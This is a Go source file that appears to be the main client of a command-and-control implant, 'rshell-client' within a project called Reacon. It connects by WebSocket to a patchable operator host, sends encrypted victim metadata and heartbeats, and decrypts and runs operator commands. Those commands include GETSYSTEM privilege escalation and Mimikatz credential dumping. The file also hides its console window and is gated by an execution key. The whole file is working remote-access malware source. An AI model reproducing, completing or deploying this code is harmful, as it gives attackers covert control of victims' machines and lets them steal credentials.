package main

import (
	"Reacon/pkg/communication"
	"encoding/binary"
	"fmt"
	"os"
	"rshell-client/shared/config"
	"rshell-client/shared/encrypt"
	"rshell-client/shared/link"
	"rshell-client/shared/services"
	"rshell-client/shared/utils"
	"strings"
	"sync"
	"time"

	"github.com/togettoyou/wsc"
)

type Client struct {
	Connection *wsc.Wsc
	lock       sync.Mutex
	keepAlive  *time.Ticker
}

func init() {
	link.ReportError = communication.ErrorProcess
	link.ReportData = communication.DataProcess
}

func Run_main(url string) {
	WebsocketClient := &Client{}
	WebsocketClient.Connect(url)
}

func (c *Client) Connect(url string) {
	done := make(chan bool)
	c.Connection = wsc.New(url)
	c.Connection.SetConfig(&wsc.Config{
		WriteWait:         10 * time.Second,
		MinRecTime:        2 * time.Second,
		MaxRecTime:        60 * time.Second,
		RecFactor:         1.5,
		MessageBufferSize: 10240 * 10,
	})

	c.Connection.OnConnected(func() {
		if len(utils.MetaInfo) == 0 {
			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
		}
		firstBloodInt := 1
		firstBloodBytes := utils.WriteInt(firstBloodInt)
		firstBloodMsg := utils.BytesCombine(firstBloodBytes, utils.MetaInfo)
		communication.SendData(c.Connection, firstBloodMsg)
		communication.WebsocketClient = c.Connection
	})

	c.Connection.OnConnectError(func(err error) {
	})

	c.Connection.OnDisconnected(func(err error) {
	})

	c.Connection.OnClose(func(code int, text string) {
		done <- true
	})
	c.Connection.OnTextMessageSent(func(message string) {
	})
	c.Connection.OnBinaryMessageSent(func(data []byte) {
	})
	c.Connection.OnSentError(func(err error) {
	})
	c.Connection.OnPingReceived(func(appData string) {
	})
	c.Connection.OnPongReceived(func(appData string) {
	})

	c.Connection.OnTextMessageReceived(func(message string) {
	})

	c.Connection.OnBinaryMessageReceived(func(data []byte) {
		if data != nil {
			totalLen := len(data)
			if totalLen > 0 {
				rawData, err := encrypt.DecodeBase64(data)
				if err != nil {
					fmt.Println(err)
				}
				data, err = encrypt.Decrypt(rawData)
				if err != nil {
					fmt.Println(err)
				}
				decrypted, err := encrypt.Decrypt(data)
				if err != nil {
					communication.ErrorProcess(err)
					fmt.Println(err)
				}
				if len(decrypted) < 4 {
					return
				}
				cmdType := binary.BigEndian.Uint32(decrypted[:4])
				cmdBuf := decrypted[4:]

				// Long-running commands run async so keepalive doesn't time out
				if cmdType == services.GETSYSTEM || cmdType == services.MIMIKATZ {
					fmt.Printf("[debug] Async command (type=%d), spawning goroutine\n", cmdType)
					go func(ct uint32, cb []byte) {
						result, callbackType, err := services.DispatchCommand(ct, cb)
						fmt.Printf("[debug] Async result: len=%d cb=%d err=%v\n", len(result), callbackType, err)
						if err != nil {
							communication.ErrorProcess(err)
						} else if callbackType >= 0 {
							communication.DataProcess(callbackType, result)
						}
					}(cmdType, cmdBuf)
					return
				}

				if cmdBuf != nil {
					result, callbackType, err := services.DispatchCommand(cmdType, cmdBuf)
					if cmdType == services.EXIT && err == nil {
						os.Exit(1)
					}
					if err != nil {
						communication.ErrorProcess(err)
					} else if callbackType >= 0 {
						communication.DataProcess(callbackType, result)
					}
				}
			}
		}
	})
	c.keepAlive = time.NewTicker(5 * time.Second)

	c.Connection.Connect()
	go func() {
		for range c.keepAlive.C {
			c.KeepAlivePacket()
		}
	}()
	for {
		select {
		case <-done:
			return
		}
	}
}

func (c *Client) KeepAlivePacket() {
	heartBeatInt := 3
	heartBeatBytes := utils.WriteInt(heartBeatInt)
	heartBeatMsg := utils.BytesCombine(heartBeatBytes, utils.MetaInfo)
	communication.SendData(c.Connection, heartBeatMsg)
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	services.HideConsole()
	services.ProcessDPIAware()
	host := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	host = strings.ReplaceAll(host, " ", "")
	encrypt.GenerateKeyPair()
	Run_main("ws://" + host + "/ws")
}
